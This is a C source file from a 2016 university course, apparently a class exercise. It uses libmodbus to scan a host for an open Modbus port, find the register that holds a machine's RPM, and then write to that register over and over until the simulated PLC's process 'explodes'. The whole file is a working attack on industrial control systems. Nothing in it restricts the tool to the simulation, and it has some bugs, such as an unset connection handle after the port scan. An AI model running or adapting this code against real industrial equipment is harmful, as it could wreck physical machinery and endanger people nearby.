/**********************************************************************
!*
!* 2016 Evan Dye  All Rights Reserved.
!*
!**********************************************************************
!*
!* Author       : Evan Dye
!* Institution  : University of New Mexico
!* Course       : CS-544
!* Semester     : Spring 2016
!*
!*********************************************************************
!******************************************************************************
! Purpose:   To connect to simulated plc and modify RPM register until "expolosion"
!
!*******************************************************************************/

#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <modbus.h>

#include "options.h"


int naivePortScan(int startingPort, char *ipAddress)
{
	int i, j; //Used for looping
	int port; //return value
	int err; //Used for checking of modbus calls
	modbus_t *modbusConnection;
	uint8_t req_unit8[128]; //used to store exception info


	for(i = startingPort; i < 65536; ++i)
	{
		port = i;

		modbusConnection = modbus_new_tcp(ipAddress, port);
		if(modbus_connect(modbusConnection) == -1)
		{
			modbus_free(modbusConnection);
		}
		else
		{
			//Verify that the ip/port pair is likely modbus
			for(j = 1; j < 12; ++j)
			{
				err = modbus_reply_exception(modbusConnection, req_unit8, j);
				if(err == -1)
				{
					modbus_close(modbusConnection);
					modbus_free(modbusConnection);
					break; //We've found an error code that doesn't work, so break out of the loop
				}
			}
			if(j == 12)
			{
				break; //We've found a port that might work, so break out of the loop
			}
		}
	}
	if(port >= 65536)
	{
		port = -1; //return error
	}

	return port;
}


int main(int argc, char **argv)
{
	int i, j; //used for looping

	int err; //Used for modbus error checking
	options_t options;
	modbus_t *modbusConnection;
	uint8_t req_unit8[128];
	uint16_t reg[128];

	get_options(argc, argv, &options);
	print_options(&options);

	if(options.port == 0)
	{
		options.port = naivePortScan(1, options.ipAddress);
		if(options.port == -1)
		{
			fprintf(stderr, "No modbus ports found at %s\n", options.ipAddress);
			return -1;
		}
	}
	else
	{
		modbusConnection = modbus_new_tcp(options.ipAddress, options.port);
		if(modbus_connect(modbusConnection) == -1)
		{
			fprintf(stderr, "Connection failed: %s\n", modbus_strerror(errno));
			modbus_free(modbusConnection);
			return -1;
		}
		//Verify that the ip/port pair is likely modbus
		for(j = 1; j < 12; ++j)
		{
			err = modbus_reply_exception(modbusConnection,req_unit8, j);
			if(err == -1)
			{
				fprintf(stderr, "Are you sure this is a modbus connection? Error code checking failed: %s\n", modbus_strerror(errno));
				modbus_close(modbusConnection);
				modbus_free(modbusConnection);
				return -1;
			}
		}
	}

	//Auto register finding
	if(options.registerAddress == -1)
	{
		i = 0;
		err = 0;
		while(err != -1)
		{
			err = modbus_read_registers(modbusConnection, i, 1, reg);

			if(abs(reg[0] - options.targetRPM) <= options.tolerence)
			{
				options.registerAddress = i;
				break;
			}
			++i;
		}
	}
	if(options.registerAddress == -1) //make sure somethine was actually found
	{
			fprintf(stderr, "No registers found within expected range\n");
			return -1;
	}

	//Double check register
	err = modbus_read_registers(modbusConnection, options.registerAddress, 1, reg);
	if (err == -1)
	{
		fprintf(stderr, "Reading register failed: %s\n", modbus_strerror(errno));
		return -1;
	}


	err = 0;
	i = 0;
	while(err != -1) //Doing it this way for now, will come up with better solution at a later time
	{
		err = modbus_write_register(modbusConnection, options.registerAddress, 0);
		++i;
	}

	//err = modbus_write_register(modbusConnection, options.registerAddress, 0);
	if(err == -1)
	{
		fprintf(stderr, "Writing to register failed on iteration %d: %s\n", i, modbus_strerror(errno));
		modbus_close(modbusConnection);
		modbus_free(modbusConnection);
		return -1;
	}

	modbus_close(modbusConnection);
	modbus_free(modbusConnection);
	return 0;
}

